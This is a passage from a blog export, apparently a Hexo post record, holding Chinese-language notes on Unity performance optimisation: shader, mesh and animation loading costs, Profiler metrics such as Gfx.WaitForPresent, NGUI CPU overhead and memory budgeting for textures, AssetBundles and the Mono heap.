1、在保证视觉效果的前提下，尽可能采用“够用就好”的原则，即降低网格资源的顶点数量和面片数量；\n>> * 2、研发团队对于顶点属性的使用需谨慎处理。通过以上分析可以看出，顶点属性越多，则内存占用越高，加载时间越长；\n>> * 3、如果在项目运行过程中对网格资源数据不进行读写操作（比如Morphing动画等），那么建议将Read/Write功能关闭，既可以提升加载效率，又可以大幅度降低内存占用。\n\n****\n\n# Unity Shader 加载模块\n\n* Shader资源与之前的网格资源和纹理资源不同，其本身物理Size很小。Shader资源的效率加载瓶颈并不在其自身大小的加载上，而是在Shader内容的解析上.\n>* 1、Shader资源的物理体积与内存占用虽然很小，但其加载耗时开销的CPU占用很高，这主要是因为Shader的解析CPU开销很高，成为了Shader资源加载的性能瓶颈；\n>* 2、Mobile/Particles Additive在解析方面的耗时远小于Mobile/Diffuse、Mobile/Bumped Diffsue甚至Mobile/VertexLit;\n>* 3、除Mobile/Particles Additive外，其他三个(Mobile-Diffuse，Mobile-VertexLit，Mobile-Bumped Diffuse)主流Shader在加载时均会造成明显的降帧，甚至卡顿。因此，研发团队应尽可能避免在非切换场景时刻进行Shader的加载操作；\n>* 4、Mobile Shader较之同种Normal Shader在加载方面确实有一定的性能提升；\n>* 5、Shader的加载开销经常在几百甚至上千毫秒以上,其加载耗时居然要高于几张Atlas纹理或者拥有上万片面的Mesh网格!!\n* Shader解析时的真正耗时原因    \n>* 一般情况下，Shader加载的CPU耗时与其Keyword数量有关，Keyword数量越多，则加载开销也越大。Shader的Keyword数量是会随着场景设置的不同而变化的。在Unity 5.x中，Unity默认会根据场景设置、Shader Pass等来调整Shader的Keyword，比如如果存在Lightmap的使用，则会默认将对应的Keyword打开，而对于没有使用Fog的项目，则会直接将相关Keyword关闭。\n>* 对于Unity 5.x项目，可通过skip_variants操作在Shader中直接去除相关Keyword。\n>* 直接去除Shader中的Fallback选项。Fallback功能是对于无法使用当前Shader的硬件设备可以使用对硬件设备要求更低的Fallback Shader来进行渲染，以保证渲染的稳定性。\n* Shader加载方式,5.x之后的Shader加载只是加载,加载之后还需要运行时编译,需要主动使用shader.WarmupAllShaders又或者ShaderVariantCollection.WarmUp来编译shader\n>* 大量相同Shader重复解析造成的。是因为Shader被打包到不同的AssetBundle文件中，每次切换场景时，AssetBundle均会被频繁地进行加载和卸载，从而造成了大量相同的Shader被重复加载和卸载。\n>* 1、通过依赖关系打包，将项目中的所有Shader抽离并打成一个独立的AssetBundle文件，其他AssetBundle与其建立依赖；并对其进行预加载，以降低后续不必要的加载开销。\n>* 2、Shader的AssetBundle文件在游戏启动后即进行加载并常驻内存，因为一款项目的Shader种类数量一般在50~100不等，且每个均很小，即便全部常驻内存，其内存总占用量也不会超过2MB；\n>* 3、后续Prefab加载和实例化后，Unity引擎会通过AssetBundle之间的依赖关系直接找到对应的Shader资源进行使用，而不会再进行加载和解析操作。\n>* 4、正在使用Resources.Load来加载资源的研发团队，可以尝试使用ShaderVariantCollection(着色器变体群,着色器资源列表，是一个由通道类型+着色器关键字组合的列表)来对Shader进行Preload,同样也可以达到避免相同Shader重复加载的效果。https://www.cnblogs.com/rexzhao/p/7884905.html\n>* 5、在生成时剔除多余着色器变体, 1)个别着色器特性，比如使用 #pragma shader_feature的着色器，如果没有材质使用到了这个特性，那么就不会把它打包进去；2)没有被任何场景使用到的雾效(Fog)或光照贴图模式(Lightmap)的着色器变体，也不会打包进去。\n>* 6.shader加载造成的卡顿有两种情况：1、着色器变种已经打包到APP中，只需要加载该变体，创建GPUProgram就可以了.2、着色器变种没用被打包，这时需要shaderlab文件进行解析和编译相应的变种，然后创建GUPProgram\n\n****\n\n# Unity动画加载模块\n\n* AnimationClip资源是项目运行时最常加载的资源之一，且其加载效率主要由其自身加载量决定，而决定AnimationClip资源加载量的主要因素则是它的压缩格式。\n>* Unity引擎对导入的AnimationClip提供三种压缩格式，Off、Keyframe Reduction和Optimal。Off表示不采用压缩处理；Keyframe Reduction表示使用关键帧进行处理，Optimal则表示Unity引擎会根据动画曲线的特点来自动选择一个最优的压缩方式，可能是关键帧压缩，也可能是Dense压缩。https://docs.unity3d.com/Manual/class-Animator.html\n>* Optimal压缩方式确实可以提升资源的加载效率，无论是在高端机、中端机还是低端机上；\n>* 硬件设备性能越好，其加载效率越高。但随着设备的提升，Keyframe Reduction和Optimal的加载效率提升已不十分明显；\n>* Optimal压缩方式可能会降低动画的视觉质量，因此，是否最终选择Optimal压缩模式，还需根据最终视觉效果的接受程度来决定。\n\n\n\n\n\n****\n\n# Xcode 增量打包\nhttps://blog.uwa4d.com/archives/USparkle_iOS.html\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n****\n\n\n## Overview 类型\n* 1 Profiler中WaitForTargetFPS详解 https://blog.csdn.net/suifcd/article/details/50942686\n该参数一般出现在 CPU开销过低，且通过设定了目标帧率的情况下（Application.targetFrameRate）。当上一帧低于目标帧率时，将会在本帧产生一个WaitForTargetFPS的空闲等待耗时，以维持目标帧率。\nGfx.WaitForPresent && Graphics.PresentAndSync\n这两个参数在Profiler中经常出现CPU占用较高的情况，且仅在发布版本中可以看到。究其原因，其实是CPU和GPU之间的垂直同步（VSync）导致的，之所以会有两种参数，主要是与项目是否开启多线程渲染有关。当项目开启多线程渲染时，你看到的则是Gfx.WaitForPresent；当项目未开启多线程渲染时，看到的则是Graphics.PresentAndSync。\nGraphics.PresentAndSync 是指主线程进行Present时的等待时间和等待垂直同步的时间。Gfx.WaitForPresent其字面意思同样也是进行Present时需要等待的时间，但这里其实省略了很多的内容。其真实的意思应该是为了在渲染子线程（Rendering Thread）中进行Present，当前主线程（MainThread）需要等待的时间。\n\n当项目开启多线程程渲染时，引擎会将Present等相关工作尽可能放到渲染线程去执行，即主线程只需通过指令调用渲染线程，并让其进行Present，从而来降低主线程的压力。但是，当CPU希望进行Present操作时，其需要等待GPU完成上一次的渲染。如果GPU渲染开销很大，则CPU的Present操作将一直处于等待操作，其等待时间，即为当前帧的Gfx.WaitForPresent时间，如下图所示。\n![多线程渲染1](多线程渲染1.png)\n\n同理，当项目未开启多线程渲染时，引擎会在主线程中进行Present(当前绝大多数的移动游戏均在使用该中操作)，当然，Present操作同样需要等待GPU完成上一次的渲染。如果GPU渲染开销很大，则CPU的Present操作将一直处于等待操作，其等待时间，即为当前帧的Graphics.PresentAndSync时间:\n![多线程渲染2](多线程渲染2.png)\n所以，如果你的项目中，Gfx.WaitForPresent或Graphics.PresentAndSync的CPU耗时非常高时，其实并不是它们自己做了什么神秘的操作，而是你当前的渲染任务太重，GPU负载过高所致。\n\n同时，对于开启垂直同步的项目而言，Gfx.WaitForPresent 和 Graphics.PresentAndSync也会出现CPU占用较高的情况。在解释这种问题之前，我们先以“大家乘坐地铁”来举个例子。一般来说，地铁到达每一站的时间均是平均且一定的，假设每10分钟一班接走一批乘客。但是几乎没有多少乘客可以按点到达，如果提前两分钟到达，则只需要等待两分钟即可乘上地铁，但是，如果你错过了，哪怕只差了一分钟，那么你也不得不再等待九分钟才能乘上地铁。\n\n上述的情况我们经常会遇到。在GPU的渲染流水线中，其转换front buffer和back buffer的工作原理和“乘坐地铁”其实是一致的。大家可以把GPU的流水线简单地想象成为一列地铁。对于移动设备来说，GPU的帧率一般为30帧/秒或60帧/秒，即VSync每33ms或每16.6ms“到站一次”，CPU的Present即为“乘客乘上地铁”，然后前往各自的目的地。与乘客的早到和晚到一样，CPU的Present也会出现类似的情况，比如：\n\n● CPU端开销非常小，Present在很早即被执行，但此时VSync还没到，则会出现较高的等待时间，即Gfx.WaitForPresent 和 Graphics.PresentAndSync的CPU开销看上去很高。\n● CPU端开销很高，使得Present执行时错过了VSync操作，这样，Present将不得不等待下一次VSync的到来，从而造成了Gfx.WaitForPresent 和 Graphics.PresentAndSync的CPU开销较高。这种情况在CPU端加载过量资源时特别容易发生，比如WWW加载较大的AssetBundle、Resource.Load加载大量的Texture等等。\n\n通过以上的讲解，我们希望此刻的你已经对Gfx.WaitForPresent 和 Graphics.PresentAndSync已经有了深入的理解。这两个参数无论CPU占用多少，其实都不是这两个参数的自身问题，而是项目的其他部分造成。对此，我们做一个总结，以方便你进一步加深印象。\n\n造成这两个参数的CPU占用较高的原因主要有以下三种原因：\n\n```\n\n● CPU开销非常低，所以CPU在等待GPU完成渲染工作或等待VSync的到来；\n● CPU开销很高，使Present错过了当前帧的VSync，即不得不等待下一次VSync的到来；\n● GPU开销很高，CPU的Present需要等待GPU上一帧渲染工作的完成。    \n\n最后，如何优化并降低这两个参数的CPU占用呢？ 那就是，忽略Gfx.WaitForPresent 和 Graphics.PresentAndSync这两个参数，优化其他你能优化的一切！\n\n```\n# UnityEngine.SetupCoroutine:InvokeMoveNext\n\n\n****","slug":"Unity/Optimize/软件UWA优化","published":1,"updated":"2020-06-15T07:11:22.284Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckfvz8d0h004b2gk7f4jsgkes","content":"<h1 id=\"性能优化大合集-请看下面的官方介绍\"><a href=\"#性能优化大合集-请看下面的官方介绍\" class=\"headerlink\" title=\"性能优化大合集,请看下面的官方介绍\"></a>性能优化大合集,请看下面的官方介绍</h1><ul>\n<li>UWA 优化百科向导: <a href=\"https://blog.uwa4d.com/archives/Index.html\" target=\"_blank\" rel=\"noopener\">https://blog.uwa4d.com/archives/Index.html</a>  </li>\n<li>UWA Unity性能优化大合集，All In One ! <a href=\"https://blog.uwa4d.com/archives/allinone.html\" target=\"_blank\" rel=\"noopener\">https://blog.uwa4d.com/archives/allinone.html</a></li>\n<li>如何看懂性能报告  <a href=\"https://blog.uwa4d.com/archives/Simple_PA_General.html\" target=\"_blank\" rel=\"noopener\">https://blog.uwa4d.com/archives/Simple_PA_General.html</a></li>\n</ul>\n<hr>\n<h1 id=\"性能总结\"><a href=\"#性能总结\" class=\"headerlink\" title=\"性能总结\"></a>性能总结</h1><ul>\n<li>查看这个性能分析图,性能总结–&gt; <a href=\"https://www.uwa4d.com/demo/pa.html?v=5x&amp;platform=android&amp;name=jws&amp;device=RedMiNote2\" target=\"_blank\" rel=\"noopener\">https://www.uwa4d.com/demo/pa.html?v=5x&amp;platform=android&amp;name=jws&amp;device=RedMiNote2</a> <blockquote>\n<ul>\n<li>总体帧数：以一秒 30 帧为例,10 分钟测试,理想性能帧数可以跑到16000~18000帧,如果项目帧数低于这个范围，那么你的游戏可能正在经受一定的帧率卡顿问题,需要查看某一段时间内的性能瓶颈       </li>\n<li>总场景数     </li>\n<li>GC次数：测试过程中系统垃圾回收操作（Garbage Collection）的调用次数,每次GC调用均会造成一定程度上的卡顿，降低了项目运行的流畅度,如果开发人员的逻辑代码分配堆内存过大过快的话，则GC调用的次数也会随之增加,标准为1000帧/次以上调用 GC,这个值越大调用一次 GC 越好.      </li>\n<li>CPU均值：测试过程中平均每帧的CPU占用.高/中/低档的主流机型,设备性能越好，CPU耗时的均值肯定是越低        </li>\n<li>CPU 占用(帧数占比):这个地方是 4 个图,CPU耗时超过33ms的帧数耗时超过了68%（请注意，UWA的建议是低于10%），超过50ms的帧数耗时达到35%.      </li>\n<li>总体 CPU 耗时走势:如果某条线特别高,需要看下是否可以进行优化,对比测试       </li>\n<li>总内存,堆内存优化:根据不同游戏进行不同的设定,定制一个合理的内存峰值才是正确的,也需要根据不同机器的性能评定.目前Unity所使用的Mono版本有这么个特点,Mono的堆内存一旦分配，就不会返还给系统.这意味着Mono的堆内存是只升不降的.IL2CPP版本在堆内存分配方面和Mono 最大的不同主要是Reserved Total 是可以下降的，而 Mono的 Reserved Total 只会上升不会下降.    </li>\n<li>关于任务列表:UWA 的测评报告还根据性能状态给出了优化任务列表,按照问题的严重程度设置了优先级，并对每个优化任务给出了需要检查或优化的步骤。     </li>\n<li>高 CPU 占用函数:       <blockquote>\n<p>Camera.Render<br>UIPanel.LateUpdate()<br>UnityEngine.SetupCoroutine() <Coroutine- invokemovenext><br>Animators.Update<br>Loading.UpdatePreloading<br>NavMeshManager<br>UICamera.Update()<br>UIRect.Update()<br>Physics.Processing<br>LoadingManager.Update()<br>Monobehaviour.OnMouse_<br>SystemInfoPrinter.Update()<br>TionManager.Update()<br>MeshSkinning.Update<br>AINormalWarrior.Update()<br>Physics.ProcessReports<br>SoundManager.Update()<br>Destroy<br>UIRect.Start()<br>TweenEffectBase.Update()     </Coroutine-></p>\n</blockquote>\n</li>\n</ul>\n</blockquote>\n</li>\n</ul>\n<blockquote>\n<ul>\n<li>高堆内存分配函数:     </li>\n</ul>\n</blockquote>\n<blockquote>\n<blockquote>\n<p>UIPanel.LateUpdate()<br>UnityEngine.SetupCoroutine() <Coroutine- invokemovenext><br>UICamera.Update()<br>TionManager.Update()<br>Physics.ProcessReports<br>LoadingManager.Update()<br>Animators.Update<br>BattleWinWnd.ShowContinueTip()<br>CheatManager.Update()<br>Destroy<br>UIRect.Start()<br>DynamicContent.Update()<br>EnemyHintAgent.Update()<br>Loading.UpdatePreloading<br>UIMessageBoxManager.Update()<br>GroupTutorialSystem.Update()<br>iTween.Update()<br>LevelManager.Update()<br>AINormalWarrior.Update()<br>PlayerBattleHUD.LateUpdate()</Coroutine-></p>\n</blockquote>\n</blockquote>\n<hr>\n<h1 id=\"性能优化—CPU篇\"><a href=\"#性能优化—CPU篇\" class=\"headerlink\" title=\"性能优化—CPU篇\"></a>性能优化—CPU篇</h1><ul>\n<li>查看这个性能分析图,总体性能趋势–&gt; <a href=\"https://www.uwa4d.com/demo/pa.html?v=5x&amp;platform=android&amp;name=jws&amp;device=RedMiNote2\" target=\"_blank\" rel=\"noopener\">https://www.uwa4d.com/demo/pa.html?v=5x&amp;platform=android&amp;name=jws&amp;device=RedMiNote2</a> </li>\n<li>CPU方面的性能开销主要可归结为两大类：引擎模块性能开销(渲染模块、动画模块、物理模块、UI模块、粒子系统、加载模块和GC调用等等)和自身代码性能开销(第三方,以及 Unity 管理不到的内存)<blockquote>\n<ul>\n<li>渲染模块 :<blockquote>\n<p>（1）降低Draw Call,与维持总线带宽平衡,Draw Call是渲染模块优化方面的重中之重,一般来说，Draw Call越高，则渲染模块的CPU开销越大,降低Draw Call的方法则主要是减少所渲染物体的材质种类,并通过Draw Call Batching(<a href=\"https://docs.unity3d.com/Manual/DrawCallBatching.html)来减少其数量,游戏性能并非Draw\" target=\"_blank\" rel=\"noopener\">https://docs.unity3d.com/Manual/DrawCallBatching.html)来减少其数量,游戏性能并非Draw</a> Call越小越好,决定渲染模块性能的除了Draw Call之外，还有用于传输渲染数据的总线带宽.当我们使用Draw Call Batching将同种材质的网格模型拼合在一起时，可能会造成同一时间需要传输的数据（Texture、VB/IB等）大大增加，以至于造成带宽“堵塞”，在资源无法及时传输过去的情况下，GPU只能等待，从而反倒降低了游戏的运行帧率。Draw Call和总线带宽是天平的两端，我们需要做的是尽可能维持天平的平衡，任何一边过高或过低，对性能来说都是无益的。<br>(2) 简化资源,每帧渲染的三角形面片数、网格和纹理资源的具体使用情况    </p>\n</blockquote>\n</li>\n</ul>\n</blockquote>\n</li>\n</ul>\n<blockquote>\n<ul>\n<li>UI 模块<blockquote>\n<p>在NGUI的优化方面，UIPanel.LateUpdate为性能优化的重中之重,它是NGUI中CPU开销最大的函数，没有之一.<br>对于UIPanel.LateUpdate的优化，主要着眼于UIPanel的布局，其原则如下：</p>\n<blockquote>\n<ul>\n<li>尽可能将动态UI元素和静态UI元素分离到不同的UIPanel中（UI的重建以UIPanel为单位），从而尽可能将因为变动的UI元素引起的重构控制在较小的范围内；</li>\n<li>尽可能让动态UI元素按照同步性进行划分，即运动频率不同的UI元素尽可能分离放在不同的UIPanel中；</li>\n<li>控制同一个UIPanel中动态UI元素的数量，数量越多，所创建的Mesh越大，从而使得重构的开销显著增加。比如，战斗过程中的HUD运动血条可能会出现较多，此时，建议研发团队将运动血条分离成不同的UIPanel，每组UIPanel下5~10个动态UI为宜。这种做法，其本质是从概率上尽可能降低单帧中UIPanel的重建开销。</li>\n</ul>\n</blockquote>\n</blockquote>\n</li>\n<li>加载模块     <blockquote>\n<p>加载模块的性能开销比较集中，主要出现于场景切换处(前一场景的场景卸载和下一场景的场景加载)，且CPU占用峰值均较高<br>场景卸载情况下的 Destroy,引擎在切换场景时会收集未标识成“DontDestoryOnLoad”的GameObject及其Component，然后进行Destroy。同时，代码中的OnDestory被触发执行，这里的性能开销主要取决于OnDestroy回调函数中的代码逻辑。<br>场景卸载情况下的 Resources.UnloadUnusedAssets 一般情况下，场景切换过程中，该API会被调用两次，一次为引擎在切换场景时自动调用，另一次则为用户手动调用（一般出现在场景加载后，用户调用它来确保上一场景的资源被卸载干净）。在我们测评过的大量项目中，该API的CPU开销主要集中在500ms~3000ms之间。其耗时开销主要取决于场景中Asset和Object的数量，数量越多，则耗时越慢。<br>场景加载情况下的  资源加载,资源加载几乎占据了整个加载过程的90%时间以上，其加载效率主要取决于资源的加载方式（Resource.Load或AssetBundle加载）、加载量（纹理、网格、材质等资源数据的大小）和资源格式（纹理格式、音频格式等）等等。不同的加载方式、不同的资源格式，其加载效率可谓千差万别，所以我们在UWA测评报告中，特别将每种资源的具体使用情况进行展示，以帮助用户可以立刻查找到问题资源并及时进行改正。<br>场景加载情况下的 Instantiate实例化 :在场景加载过程中，往往伴随着大量的Instantiate实例化操作，比如UI界面实例化、角色/怪物实例化、场景建筑实例化等等。在Instantiate实例化时，引擎底层会查看其相关的资源是否已经被加载，如果没有，则会先加载其相关资源，再进行实例化，这其实是大家遇到的大多数“Instantiate耗时问题”的根本原因，这也是为什么我们在之前的AssetBundle文章中所提倡的资源依赖关系打包并进行预加载，从而来缓解Instantiate实例化时的压力（关于AssetBundle资源的加载，则是另一个很大的Story了，我们会在以后的AssetBundle加载技术专题中进行详细的讲解）<br>场景加载情况下的 SerializedField序列化开销 Instantiate实例化的性能开销还体现在脚本代码的序列化上，如果脚本中需要序列化的信息很多，则Instantiate实例化时的时间亦会很长。最直接的例子就是NGUI，其代码中存在很多SerializedField标识，从而在实例化时带来了较多的代码序列化开销。因此，在大家为代码增加序列化信息时，这一点是需要大家时刻关注的</p>\n</blockquote>\n</li>\n<li>代码效率    <blockquote>\n<p>性能开销都遵循着“二八原则”,即80%的性能开销都集中在20%的函数上<br>Camera.Render<br>MovementScript.FixedUpdate()<br>ParticleSystem.Update<br>Physics.Simulate<br>TerrainManager.LoadTerrainObject()[Coroutine:MoveNext]<br>TerrainManager.LoadTerrainSplices()[Coroutine:MoveNext]<br>ParticleSystem.WaitForUpdateThreads()<br>GameStarter.Update()<br>等等</p>\n</blockquote>\n</li>\n</ul>\n</blockquote>\n<hr>\n<h1 id=\"性能优化，进无止境-内存篇\"><a href=\"#性能优化，进无止境-内存篇\" class=\"headerlink\" title=\"性能优化，进无止境-内存篇\"></a>性能优化，进无止境-内存篇</h1><ul>\n<li>1 内存的开销无外乎以下三大部分:1.Unity资源内存占用；2. Unity引擎模块自身内存占用；3.Unity用户管理内存;4.第三方插件内存(比如 toLua),不属于Unity 。<h3 id=\"一-资源内存占用\"><a href=\"#一-资源内存占用\" class=\"headerlink\" title=\"一:资源内存占用\"></a>一:资源内存占用</h3>在一个较为复杂的大中型项目中，资源的内存占用往往占据了总体内存的70%以上.纹理（Texture）、网格（Mesh）、动画片段（AnimationClip）、音频片段（AudioClip）、材质（Material）、着色器（Shader）、字体资源（Font）以及文本资源（Text Asset）等等.其中，纹理、网格、动画片段和音频片段则是最容易造成较大内存开销的资源<h4 id=\"纹理\"><a href=\"#纹理\" class=\"headerlink\" title=\"纹理\"></a>纹理</h4><blockquote>\n<blockquote>\n<ul>\n<li>纹理资源可以说是几乎所有游戏项目中占据最大内存开销的资源,一个6万面片的场景，网格资源最大才不过10MB，但一个2048x2048的纹理，可能直接就达到16MB.需要优化的点<br>纹理格式:Android平台的ETC、iOS平台的PVRTC、Windows PC上的DXT,具体的采用何种方式对纹理进行操作需要根据项目情况来看.<br>在使用硬件支持的纹理格式时，你可能会遇到以下几个问题：<blockquote>\n<ul>\n<li>色阶问题,由于ETC、PVRTC等格式均为有损压缩，因此，当纹理色差范围跨度较大时，均不可避免地造成不同程度的“阶梯”状的色阶问题。因此，很多研发团队使用RGBA32/ARGB32格式来实现更好的效果。但是，这种做法将造成很大的内存占用。比如，同样一张1024x1024的纹理，如果不开启Mipmap，并且为PVRTC格式，则其内存占用为512KB，而如果转换为RGBA32位，则很可能占用达到4MB。所以，研发团队在使用RGBA32或ARGB32格式的纹理时，一定要慎重考虑，更为明智的选择是尽量减少纹理的色差范围，使其尽可能使用硬件支持的压缩格式进行储存。</li>\n<li>ETC1 不支持透明通道问题,在Android平台上，对于使用OpenGL ES 2.0的设备，其纹理格式仅能支持ETC1格式，该格式有个较为严重的问题，即不支持Alpha透明通道，使得透明贴图无法直接通过ETC1格式来进行储存。对此，我们建议研发团队将透明贴图尽可能分拆成两张，即一张RGB24位纹理记录原始纹理的颜色部分和一张Alpha8纹理记录原始纹理的透明通道部分。然后，将这两张贴图分别转化为ETC1格式的纹理，并通过特定的Shader来进行渲染，从而来达到支持透明贴图的效果。该种方法不仅可以极大程度上逼近RGBA透明贴图的渲染效果，同时还可以降低纹理的内存占用，是我们非常推荐的使用方式。建议:尽量采用 ETC2,在 Android 设备支持OpenGL ES 3.0的上面进行市场分流       </li>\n</ul>\n</blockquote>\n</li>\n</ul>\n</blockquote>\n</blockquote>\n</li>\n</ul>\n<blockquote>\n<blockquote>\n<ul>\n<li>纹理尺寸,一般来说，纹理尺寸越大，则内存占用越大。尽可能降低纹理尺寸,如果512x512的纹理对于显示效果已经够用，那么就不要使用1024x1024的纹理.</li>\n<li>Mipmap功能,Mipmap旨在有效降低渲染带宽的压力，提升游戏的渲染效率.开启Mipmap会将纹理内存提升1.33倍.对于具有较大纵深感的3D游戏来说，3D场景模型和角色我们一般是建议开启Mipmap功能的.但是经常会发现部分UI纹理也开启了Mipmap功能,这其实就没有必要的,绝大多数UI均是渲染在屏幕最上层，开启Mipmap并不会提升渲染效率，反倒会增加无谓的内存占用.</li>\n<li>Read &amp; Write 一般情况下，纹理资源的“Read &amp; Write”功能在Unity引擎中是默认关闭的。项目深度优化时发现了不少项目的纹理资源会开启该选项,</li>\n</ul>\n</blockquote>\n</blockquote>\n<h4 id=\"网格\"><a href=\"#网格\" class=\"headerlink\" title=\"网格\"></a>网格</h4><blockquote>\n<blockquote>\n<ul>\n<li>Normal、Color和Tangent,Mesh资源的数据中经常会含有大量的Color数据、Normal数据和Tangent数据,这些数据的存在将大幅度增加Mesh资源的文件体积和内存占用.Color数据和Normal数据主要为3DMax、Maya等建模软件导出时设置所生成，而Tangent一般为导入引擎时生成.更为麻烦的是，如果项目对Mesh进行Draw Call Batching操作的话，那么将很有可能进一步增大总体内存的占用.比如，100个Mesh进行拼合，其中99个Mesh均没有Color、Tangent等属性，剩下一个则包含有Color、Normal和Tangent属性，那么Mesh拼合后，CombinedMesh中将为每个Mesh来添加上此三个顶点属性，进而造成很大的内存开销。需要查看该模型的渲染Shader中是否需要这些数据进行渲染</li>\n<li></li>\n</ul>\n</blockquote>\n</blockquote>\n<h3 id=\"二-引擎模块自身占用\"><a href=\"#二-引擎模块自身占用\" class=\"headerlink\" title=\"二:引擎模块自身占用\"></a>二:引擎模块自身占用</h3><blockquote>\n<ul>\n<li>引擎自身中存在内存开销的部分纷繁复杂，可以说是由巨量的“微小”内存所累积起来的,GameObject及其各种Component（最大量的Component应该算是Transform了）,ParticleSystem、MonoScript以及各种各样的模块Manager（SceneManager、CanvasManager、PersistentManager等)…<br>一般情况下，上面所指出的引擎各组成部分的内存开销均比较小，真正占据较大内存开销的是这两处：<strong>WebStream</strong>   <strong>SerializedFile</strong> ,其绝大部分的内存分配则是由AssetBundle加载资源所致,当使用new WWW或CreateFromMemory来加载AssetBundle时，Unity引擎会加载原始数据到内存中并对其进行解压,而WebStream的大小则是AssetBundle原始文件大小 + 解压后的数据大小 + DecompressionBuffer(0.5MB).<br>当你使用LoadFromCacheOrDownload、CreateFromFile或new WWW本地AssetBundle文件时产生的序列化文件.</li>\n</ul>\n</blockquote>\n<blockquote>\n<blockquote>\n<ul>\n<li>是否存在AssetBundle没有被清理干净的情况。开发团队可以通过Unity Profiler直接查看其使用具体的使用情况，并确定Take Sample时AssetBundle的存在是否合理；</li>\n<li>对于占用WebStream较大的AssetBundle文件（如UI Atlas相关的AssetBundle文件等），建议使用LoadFromCacheOrDownLoad或CreateFromFile来进行替换，即将解压后的AssetBundle数据存储于本地Cache中进行使用。这种做法非常适合于内存特别吃紧的项目，即通过本地的磁盘空间来换取内存空间。</li>\n<li>AssetBundle管理机制:<a href=\"https://blog.uwa4d.com/archives/ABTheory.html\" target=\"_blank\" rel=\"noopener\">https://blog.uwa4d.com/archives/ABTheory.html</a></li>\n</ul>\n</blockquote>\n</blockquote>\n<h3 id=\"三-托管堆内存占用\"><a href=\"#三-托管堆内存占用\" class=\"headerlink\" title=\"三:托管堆内存占用\"></a>三:托管堆内存占用</h3><blockquote>\n<ul>\n<li>托管堆内存占用,不管是 Mono 版本还是 IL2CPP 版本,这里叫的方便一点,称为 Unity 内置托管虚拟机,其托管堆内存是由Unity 内置托管虚拟机分配和管理的。“托管” 的本意是Unity 内置托管虚拟机可以自动地改变堆的大小来适应你所需要的内存，并且适时地调用垃圾回收（Garbage Collection）操作来释放已经不需要的内存，从而降低开发人员在代码内存管理方面的门槛。</li>\n</ul>\n</blockquote>\n<blockquote>\n<blockquote>\n<ul>\n<li>用户不必要的堆内存分配主要来自于以下几个方面:</li>\n<li>高频率地 New Class/Container/Array等。研发团队切记不要在Update、FixUpdate或较高调用频率的函数中开辟堆内存，这会对你的项目内存和性能均造成非常大的伤害。做个简单的计算，假设你的项目中某一函数每一帧只分配100B的堆内存，帧率是1秒30帧，那么1秒钟游戏的堆内存分配则是3KB，1分钟的堆内存分配就是180KB，10分钟后就已经分配了1.8MB。如果你有10个这样的函数，那么10分钟后，堆内存的分配就是18MB，这期间，它可能会造成Mono的堆内存峰值升高，同时又可能引起了多次GC的调用。在我们的测评项目中，一个函数在10分钟内分配上百MB的情况比比皆是，有时候甚至会分配上GB的堆内存。</li>\n<li>Log输出。我们发现在大量的项目中，仍然存在大量Log输出的情况。建议研发团队对自身Log的输出进行严格的控制，仅保留关键Log，以避免不必要的堆内存分配。对此，我们在UWA测评报告中对Log的输出进行了详细的检测，不仅提供详细的性能开销，同时占用Log输出的调用路径。这样，研发团队可直接通过报告定位和控制Log的输出。</li>\n<li>UIPanel.LateUpdate。这是NGUI中CPU和堆内存开销最大的函数。它本身只是一个函数，但NGUI的大量使用使它逐渐成为了一个不可忽视规则。该函数的堆内存分配和自身CPU开销，其根源上是一致的，即是由UI网格的重建造成。因此，其对应的优化方法是直接查看CPU篇中的UI模块讲解。(1:动静分离在不同的 UIPanel 中,每组UIPanel下5~10个动态UI为宜)</li>\n<li>String连接、部分引擎API（GetComponent）的使用 等等  </li>\n</ul>\n</blockquote>\n</blockquote>\n<h3 id=\"内存占用标准\"><a href=\"#内存占用标准\" class=\"headerlink\" title=\"内存占用标准\"></a>内存占用标准</h3><blockquote>\n<ul>\n<li>某些渠道对Android游戏的PSS内存进行了严格的限制。一般要求游戏的PSS内存在200MB以下。这是我们将Reserved Total内存设定在150MB的另外一个重要原因。(旧)<br>pss内存:进程的内存占用情况.有一些内存是多个进程共享的，我们计算的时候如果把这些计算进去进程的内存占用，显然会多算。<br>pss的意思是进程自己独自占有的+共享的/共享的数目。<br>因此如果进程有自己独立的内存100M，和另外一个进程共享10M。<br>那么pss就是100 + 10/2=105</li>\n<li>较为合理的内存分配额度<br>纹理资源     0.33 内存资源<br>网格资源     0.13 内存资源<br>动画片段     0.1  内存资源<br>音频片段     0.1  内存资源<br>Mono内存    0.26 内存资源<br>其他        0.06 内存资源<br>其中如果是 IL2CPP 版本的话,内存是可以返还给系统的,则无需按照这个分配额度进行分配</li>\n</ul>\n</blockquote>\n<h3 id=\"四-内存泄露\"><a href=\"#四-内存泄露\" class=\"headerlink\" title=\"四:内存泄露\"></a>四:内存泄露</h3><blockquote>\n<ul>\n<li>内存泄露的误区:     <blockquote>\n<ul>\n<li>误区一<br>我的项目进出场景前后内存回落不一致，比如进入场景后，内存增加40MB，出来后下降30MB，仍有10MB内存没有返回给系统，即说明内存存在泄露情况。</li>\n<li>误区二<br>我的项目在进出场景前后，Unity Profiler中内存回落正常，但Android的PSS数值并没有完全回落（出场景后的PSS值高于进场景前的PSS值），即说明内存存在泄露情况。  </li>\n<li>以上两种情况均不能表明内存存在泄漏问题,造成内存不能完全回落的情况有很多,资源加载后常驻内存以备后续使用,Mono堆内存的只升不降等等,这些均可造成内存无法完全回落</li>\n</ul>\n</blockquote>\n</li>\n</ul>\n</blockquote>\n<h3 id=\"五-检查资源的使用情况，特别是纹理、网格等资源的使用\"><a href=\"#五-检查资源的使用情况，特别是纹理、网格等资源的使用\" class=\"headerlink\" title=\"五:检查资源的使用情况，特别是纹理、网格等资源的使用\"></a>五:检查资源的使用情况，特别是纹理、网格等资源的使用</h3><blockquote>\n<ul>\n<li>资源泄漏是内存泄露的主要表现形式，其具体原因是用户对加载后的资源进行了储存（比如放到Container中），但在场景切换时并没有将其Remove或Clear，从而无论是引擎本身还是手动调用Resources.UnloadUnusedAssets等相关API均无法对其进行卸载，进而造成了资源泄露。对于这种情况的排查相当困难，这是因为项目中的资源量过于巨大，泄露资源往往很难定位</li>\n<li>UWA 